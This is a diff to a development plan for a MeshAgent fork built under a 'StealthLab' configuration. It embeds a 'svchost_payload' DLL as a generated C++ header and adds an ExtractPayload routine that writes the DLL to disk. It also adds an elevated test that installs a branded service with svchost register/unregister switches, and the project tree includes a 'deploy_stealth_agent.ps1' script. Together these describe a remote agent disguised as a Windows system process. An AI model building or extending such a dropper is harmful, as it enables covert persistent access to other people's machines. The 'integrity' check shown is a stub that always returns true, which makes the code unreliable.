@@ -305,6 +305,8 @@ msbuild MeshAgent-2022.sln /p:Configuration=StealthLab /p:DeviceGroup=ENGINEERIN
 
 ### Phase 2: Native Resource Embedding (Week 2-3)
 
+> **Status (2025-10-26):** The RC pipeline has been removed (`bundle_resources.rc` deleted) and `build.ps1` now builds `StealthLab_DLL` first so `bin2h` regenerates `meshcore/embedded/generated/svchost_payload.h/.json` before StealthLab binaries compile. Remaining Phase‑2 work tracks payload integrity enforcement and MeshCentral packaging updates.
+
 **Goal:** Replace bundle_resources.rc with C++ embedding
 
 #### 2.1 Binary-to-Header Conversion
@@ -327,7 +329,7 @@ int main(int argc, char** argv) {
 }
 ```
 
-**Generated Header:**
+**Generated Header:** (once `bin2h` is wired into `build.ps1`)
 ```cpp
 // meshcore/embedded/payload_data.h (auto-generated)
 namespace MeshAgent::Embedded {
@@ -354,19 +356,16 @@ constexpr char SVCHOST_PAYLOAD_SHA256[] = "283de2dd8539...";
 namespace MeshAgent::Embedded {
 
 bool ExtractPayload(const std::wstring& targetPath) {
-    // 1. Verify embedded hash
     if (!VerifyPayloadIntegrity()) {
         Log(L"[SECURITY] Embedded payload hash mismatch!");
         return false;
     }
 
-    // 2. Write to disk
     HANDLE hFile = CreateFileW(targetPath.c_str(), GENERIC_WRITE, ...);
-    DWORD written;
+    DWORD written = 0;
     WriteFile(hFile, SVCHOST_PAYLOAD_DLL, SVCHOST_PAYLOAD_SIZE, &written, nullptr);
     CloseHandle(hFile);
 
-    // 3. Verify written file
     if (!VerifyFileHash(targetPath, SVCHOST_PAYLOAD_SHA256)) {
         DeleteFileW(targetPath.c_str());
         return false;
@@ -376,13 +375,22 @@ bool ExtractPayload(const std::wstring& targetPath) {
 }
 
 bool VerifyPayloadIntegrity() {
-    // SHA-256 hash of embedded array
-    // Compare with SVCHOST_PAYLOAD_SHA256
+    // SHA-256 hash of embedded array vs SVCHOST_PAYLOAD_SHA256
     return true; // simplified
 }
 
 } // namespace
 ```
+
+**Runtime Validation Hook**
+
+```
+PowerShell (elevated):
+Set-Location C:\Users\Workstation\Documents\GitHub\MeshAgent
+.\test.ps1 -RuntimeValidation -BinaryPath meshservice\x64\StealthLab -ReportPath dist\runtime-report.json
+```
+
+The runtime suite now installs/uninstalls the branded service and exercises `-svchost-register/status/unregister`. It requires administrator privileges and a freshly generated `meshcore/embedded/generated/svchost_payload.h/.json`. Wiring this command into CI remains a Phase‑2 exit criterion.
 
 **Benefits:**
 - ✅ No RC file dependency
@@ -394,13 +402,13 @@ bool VerifyPayloadIntegrity() {
 #### 2.3 Remove Resource Compiler Dependency
 
 **Delete:**
-- `meshservice/bundle_resources.rc`
+- `meshservice/bundle_resources.rc` (legacy; removed once header embedding landed)
 - `meshservice/embedded/` directory (runtime staging)
 
 **MSBuild Changes:**
 ```xml
 <!-- Remove -->
-<ResourceCompile Include="bundle_resources.rc" />
+# (Legacy) <ResourceCompile Include="bundle_resources.rc" />
 
 <!-- Add -->
 <ClInclude Include="meshcore\embedded\payload_data.h" />
@@ -1378,7 +1386,7 @@ MeshAgent/
 │   ├── prepare_meshcentral_agent.ps1  (PowerShell)
 │   └── deploy_stealth_agent.ps1  (PowerShell)
 ├── meshservice/
-│   ├── bundle_resources.rc       (Resource file)
+│   ├── bundle_resources.rc       (legacy resource file – removed in Phase 2)
 │   ├── embedded/
 │   │   └── svchost_payload.dll   (Runtime staging)
 │   └── MeshService-2022.vcxproj
